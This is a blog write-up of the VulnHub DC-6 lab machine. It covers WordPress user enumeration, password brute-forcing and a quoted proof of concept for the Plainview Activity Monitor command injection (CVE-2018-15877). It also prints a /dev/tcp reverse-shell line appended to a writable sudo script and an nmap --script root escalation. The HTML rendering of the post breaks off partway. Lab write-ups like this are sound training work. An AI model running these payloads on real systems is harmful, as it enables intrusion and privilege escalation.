<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>VulnHub - DC-6 | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/writeups/vulnhub/vh-dc6/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.69020a70783c135cc9c2b6f08c7a1646f7a00e2550b656d72b32c342b7b4b004.css integrity="sha256-aQIKcHg8E1zJwrbwjHoWRvegDiVQtlbXKzLDQre0sAQ=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.83.1"><script>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g+"?ref=bwt",d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","711neo6qfi")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script><meta property="og:title" content="VulnHub - DC-6"><meta property="og:description" content="DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/writeups/vulnhub/vh-dc6/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-05-30T21:47:03+07:00"><meta property="article:modified_time" content="2021-05-30T21:47:03+07:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnHub - DC-6"><meta name=twitter:description content="DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"VulnHub","item":"https://fahmifj.github.io/writeups/vulnhub/"},{"@type":"ListItem","position":3,"name":"VulnHub - DC-6","item":"https://fahmifj.github.io/writeups/vulnhub/vh-dc6/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub - DC-6","name":"VulnHub - DC-6","description":"DC-6 starts off by enumerating usernames from a WordPress website. I\u0026rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user\u0026rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"DC-6 starts off by enumerating usernames from a WordPress website. I’m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user’s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.\nSkills Learned  WordPress enumeration and plugin exploitation Exploiting sudo privileges on nmap  Tools  Nmap Arpscan WPScan BurpSuite  Reconnaissance Host Discovery - arpscan Because 192.168.2.1 and 192.168.2.2 are virtual gateway addresses, the target machine’s IP address is most likely 192.168.2.104.\n→ root@iamf «dc-6» «192.168.43.234» $ arp-scan --interface eth0 '192.168.2.0/24' | tee scans/00-arp-scan-dc6 Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.1 08:00:27:e8:e9:78 PCS Systemtechnik GmbH 192.168.2.2 0a:00:27:00:00:07 (Unknown: locally administered) 192.168.2.104 08:00:27:ac:db:5f PCS Systemtechnik GmbH Nmap With initial scan, nmap shows two ports open: SSH on port 22 and Apache Web Server on port 80.\n→ root@iamf «dc-6» «192.168.43.234» $ nmap -n -sC -sV -oA scans/10-initial-dc6 '192.168.2.104' -v PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA) | 256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA) |_ 256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to http://wordy/ |_https-redirect: ERROR: Script execution failed (use -d to debug) MAC Address: 08:00:27:AC:DB:5F (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second From the results above, there’s a redirection to http://wordy/ on port 80. To properly resolve the web, I’ll add wordy to my /etc/hosts file.\n192.168.1.104 wordy Enumeration TCP 80 - Website This page clearly states that it’s a WordPress site.\n Nothing interesting to explore, but the text secure plugins seems to be a hint from the machine’s author.\nI ran a gobuster scan but found nothing useful.\nNmap NSE nmap script scan found some usernames.\n→ root@iamf «dc-6» «192.168.43.234» $ nmap -p 80 --script \"http-wordpress*\" wordy Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-11 23:13 EDT Nmap scan report for wordy (192.168.2.104) Host is up (0.00069s latency). PORT STATE SERVICE 80/tcp open http ... | /: WordPress version: 5.1.1 ... | http-wordpress-users: | Username found: admin | Username found: graham | Username found: mark | Username found: sarah | Username found: jens |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit' MAC Address: 08:00:27:AC:DB:5F (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds WPScan wpscan identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.\n→ root@iamf «dc-6» «192.168.43.234» $ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive ... [+] plainview-activity-monitor | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/ | Last Updated: 2018-08-26T15:08:00.000Z | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt | [!] The version is out of date, the latest version is 20180826 | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: Plainview Activity Monitor = 20161228 - Remote Command Execution (RCE) | Fixed in: 20180826 | References: | - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15877 | - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor | - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/ | | Version: 20161228 (50% confidence) | Found By: Readme - ChangeLog Section (Aggressive Detection) | - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt [+] user-role-editor | Location: http://wordy/wp-content/plugins/user-role-editor/ | Last Updated: 2021-04-05T02:38:00.000Z | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt | [!] The version is out of date, the latest version is 4.59 | | Found By: Known Locations (Aggressive Detection) | - http://wordy/wp-content/plugins/user-role-editor/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: User Role Editor = 4.24 - Privilege Escalation | Fixed in: 4.25 | References: | - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c | - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/ | | Version: 4.24 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://wordy/wp-content/plugins/user-role-editor/readme.txt ... I’m interested with the RCE one, but before that I’ll have to find creds.\nBrute-forcing passwords At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn’t know that the box’s author actually gave us a hint to create a custom wordlist from rokyou.txt.\n I’ll create new wordlist from rockyou.txt and then use it to perform a brute force using wpscan.\n→ root@iamf «dc-6» «192.168.43.234» $ cat /usr/share/wordlists/rockyou.txt | grep k01  passwords.txt → root@iamf «dc-6» «192.168.43.234» $ wpscan --url http://wordy/ --usernames users --passwords passwords.txt It returns one valid credentials: mark:helpdesk10.\n Foothold Shell as www-data WP Dashboard With the credentials I obtained, I can login into the admin panel.\n Plainview Activity Monitor - RCE (CVE-2018-15877) From the previous wpscan, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from exploit-db:\nhtml [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 \u0026 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well -- body scripthistory.pushState('', '', '/')script form action=\"http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor\u0026tab=activity_tools\" method=\"POST\" enctype=\"multipart/form-data\" input type=\"hidden\" name=\"ip\" value=\"google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash\" / input type=\"hidden\" name=\"lookup\" value=\"Lookup\" / input type=\"submit\" value=\"Submit request\" / form body html The vulnerability comes from this IP tools feature.\n I’ll hit the lookup button and intercept the request on Burp.\nRCE can be achieved by adding a set of malicious OS commands after the command pipe |, semi colon ; (stacked command), or logical OR || at the ip section. In this case, I send a reverse shell.\nHere is with command pipe.\n And this one by stacking commands with semicolon.\n I can not find the plugin’s source code, my best guess it can be something like this.\n... $ip = $_POST['ip'] $do_something = exec(\"dig $ip\") ... Privilege Escalation Shell as graham Internal enumeration The home directory is readable by www-data.\nwww-data@dc-6:/var/www/html/wp-admin$ find /home 2/dev/null find /home 2/dev/null ... /home/jens/backups.sh .... /home/mark/stuff/things-to-do.txt .... I immediately checked the contents of backups.sh and things-to-do.txt.\nThe backups.sh script is writable by group devs, and I’ll note that.\nwww-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh ls -l /home/jens/backups.sh -rwxrwxr-x 1 jens devs 50 Apr 26 2019 /home/jens/backups.sh www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html And this things-to-do.txt contains graham’s credentials.\nwww-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt cat /home/mark/stuff/things-to-do.txt Things to do: - Restore full functionality for the hyperdrive (need to speak to Jens) - Buy present for Sarah's farewell party - Add new user: graham - GSo7isUM1D4 - done - Apply for the OSCP course - Buy new laptop for Sarah's replacement SSH - graham I tried the graham’s creds, graham:GSo7isUM1D4, on SSH, and it worked.\n→ root@iamf «dc-6» «192.168.43.234» $ ssh graham@192.168.2.104 graham@192.168.2.104's password: Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. graham@dc-6:~$ id uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs) Shell as jens Sudo privileges - backups.sh User graham has sudo privileges on the backups.sh script, and this allows me to run the script as user jens.\ngraham@dc-6:~$ sudo -l Matching Defaults entries for graham on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.sh graham@dc-6:~$ cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html graham@dc-6:~$ ls -l /home/jens/backups.sh -rwxrwxr-x 1 jens devs 50 Apr 26 2019 /home/jens/backups.sh Because the script is also writable by graham (devs group), I can exploit this to escalate myself to jens by adding a reverse shell line to the script and then run it with sudo.\ngraham@dc-6:~$ echo 'bash -i \u0026 /dev/tcp/192.168.2.108/9000 0\u00261'  /home/jens/backups.sh  Shell as root Sudo privileges - nmap I found out that user jens is allowed to execute nmap as root user.\njens@dc-6:/home/graham$ sudo -l sudo -l Matching Defaults entries for jens on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmap I’ll also exploit this using reference from GTFObins.\njens@dc-6:/home/graham$ TF=$(mktemp) jens@dc-6:/home/graham$ echo 'os.execute(\"/bin/sh\")'  $TF jens@dc-6:/home/graham$ sudo nmap --script=$TF  And here is the flag.\nroot@dc-6:~# cat theflag.txt Yb dP 888888 88 88 8888b. dP\"Yb 88b 88 888888 d8b Yb db dP 88__ 88 88 8I Yb dP Yb 88Yb88 88__ Y8P YbdPYbdP 88\"\" 88 .o 88 .o 8I dY Yb dP 88 Y88 88\"\" `\"' YP YP 888888 88ood8 88ood8 8888Y\" YbodP 88 Y8 888888 (8) Congratulations!!! Hope you enjoyed DC-6. Just wanted to send a big thanks out there to all those who have provided feedback, and who have taken time to complete these little challenges. If you enjoyed this CTF, send me a tweet via @DCAU7.  References  https://www.vulnhub.com/entry/dc-6,315/ https://gtfobins.github.io/gtfobins/nmap/  ","wordCount":"1532","inLanguage":"en","datePublished":"2021-05-30T21:47:03+07:00","dateModified":"2021-05-30T21:47:03+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/vulnhub/vh-dc6/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class="header sticky"><nav class=nav><div class=container><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="友人F (Alt + H)">友人F</a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://fahmifj.github.io/writeups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://fahmifj.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://fahmifj.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://fahmifj.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://fahmifj.github.io/about/ title=About><span>About</span></a></li></ul><span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/>Write-ups</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/vulnhub/>VulnHub</a></div><h1 class=post-title>VulnHub - DC-6</h1><div class=post-meta>May 30, 2021&nbsp;·&nbsp;8 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><ul><li><a href=#skills-learned aria-label="Skills Learned">Skills Learned</a></li><li><a href=#tools aria-label=Tools>Tools</a></li></ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#host-discovery---arpscan aria-label="Host Discovery - arpscan">Host Discovery - arpscan</a></li><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a><ul><li><a href=#nmap-nse aria-label="Nmap NSE">Nmap NSE</a></li><li><a href=#wpscan aria-label=WPScan>WPScan</a></li><li><a href=#brute-forcing-passwords aria-label="Brute-forcing passwords">Brute-forcing passwords</a></li></ul></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a><ul><li><a href=#wp-dashboard aria-label="WP Dashboard">WP Dashboard</a></li><li><a href=#plainview-activity-monitor---rce--cve-2018-15877 aria-label="Plainview Activity Monitor - RCE  (CVE-2018-15877)">Plainview Activity Monitor - RCE (CVE-2018-15877)</a></li></ul></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-graham aria-label="Shell as graham">Shell as graham</a><ul><li><a href=#internal-enumeration aria-label="Internal enumeration">Internal enumeration</a></li><li><a href=#ssh---graham aria-label="SSH - graham">SSH - graham</a></li></ul></li><li><a href=#shell-as-jens aria-label="Shell as jens">Shell as jens</a><ul><li><a href=#sudo-privileges---backupssh aria-label="Sudo privileges - backups.sh">Sudo privileges - backups.sh</a></li></ul></li><li><a href=#shell-as--root aria-label="Shell as  root">Shell as root</a><ul><li><a href=#sudo-privileges---nmap aria-label="Sudo privileges - nmap">Sudo privileges - nmap</a></li></ul></li></ul></li><li><a href=#references aria-label=References>References</a></li></ul></div></details></div><div class=post-content><p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p><h3 id=skills-learned>Skills Learned<a hidden class=anchor aria-hidden=true href=#skills-learned>#</a></h3><ul><li>WordPress enumeration and plugin exploitation</li><li>Exploiting sudo privileges on nmap</li></ul><h3 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li>Nmap</li><li>Arpscan</li><li>WPScan</li><li>BurpSuite</li></ul><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=host-discovery---arpscan>Host Discovery - arpscan<a hidden class=anchor aria-hidden=true href=#host-discovery---arpscan>#</a></h3><p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «dc-6» «192.168.43.234» 
$ arp-scan --interface eth0 <span style=color:#e6db74>&#39;192.168.2.0/24&#39;</span> | tee scans/00-arp-scan-dc6
Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
Starting arp-scan 1.9.7 with <span style=color:#ae81ff>256</span> hosts <span style=color:#f92672>(</span>https://github.com/royhills/arp-scan<span style=color:#f92672>)</span>
192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
192.168.2.2     0a:00:27:00:00:07       <span style=color:#f92672>(</span>Unknown: locally administered<span style=color:#f92672>)</span>
192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
</code></pre></div><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span style=color:#e6db74>&#39;192.168.2.104&#39;</span> -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.25 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
MAC Address: 08:00:27:AC:DB:5F <span style=color:#f92672>(</span>Oracle VirtualBox virtual NIC<span style=color:#f92672>)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style=color:#75715e># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>192.168.1.104   wordy
</code></pre></div><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a hidden class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>This page clearly states that it&rsquo;s a WordPress site.</p><p><div class=img-container><img src=imgs/image-20210419191210177.png alt=image-20210419191210177></div></p><p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p><p>I ran a <code>gobuster</code> scan but found nothing useful.</p><h4 id=nmap-nse>Nmap NSE<a hidden class=anchor aria-hidden=true href=#nmap-nse>#</a></h4><p><code>nmap</code> script scan found some usernames.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -p <span style=color:#ae81ff>80</span> --script <span style=color:#e6db74>&#34;http-wordpress*&#34;</span> wordy
Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-04-11 23:13 EDT
Nmap scan report <span style=color:#66d9ef>for</span> wordy <span style=color:#f92672>(</span>192.168.2.104<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.00069s latency<span style=color:#f92672>)</span>.

PORT   STATE SERVICE
80/tcp open  http
...
|   /: WordPress version: 5.1.1
...
| http-wordpress-users: 
| Username found: admin
| Username found: graham
| Username found: mark
| Username found: sarah
| Username found: jens
|_Search stopped at ID <span style=color:#75715e>#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
MAC Address: 08:00:27:AC:DB:5F <span style=color:#f92672>(</span>Oracle VirtualBox virtual NIC<span style=color:#f92672>)</span>

Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 22.48 seconds
</code></pre></div><h4 id=wpscan>WPScan<a hidden class=anchor aria-hidden=true href=#wpscan>#</a></h4><p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
...
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> plainview-activity-monitor
 | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 | Last Updated: 2018-08-26T15:08:00.000Z
 | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> The version is out of date, the latest version is <span style=color:#ae81ff>20180826</span>
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Directory listing is enabled
 |
 | Found By: Known Locations <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span style=color:#ae81ff>200</span>
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> <span style=color:#ae81ff>1</span> vulnerability identified:
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Title: Plainview Activity Monitor &lt;<span style=color:#f92672>=</span> <span style=color:#ae81ff>20161228</span> - Remote Command Execution <span style=color:#f92672>(</span>RCE<span style=color:#f92672>)</span>
 |     Fixed in: <span style=color:#ae81ff>20180826</span>
 |     References:
 |      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#f92672>=</span>CVE-2018-15877
 |      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
 |
 | Version: <span style=color:#ae81ff>20161228</span> <span style=color:#f92672>(</span>50% confidence<span style=color:#f92672>)</span>
 | Found By: Readme - ChangeLog Section <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> user-role-editor
 | Location: http://wordy/wp-content/plugins/user-role-editor/
 | Last Updated: 2021-04-05T02:38:00.000Z
 | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
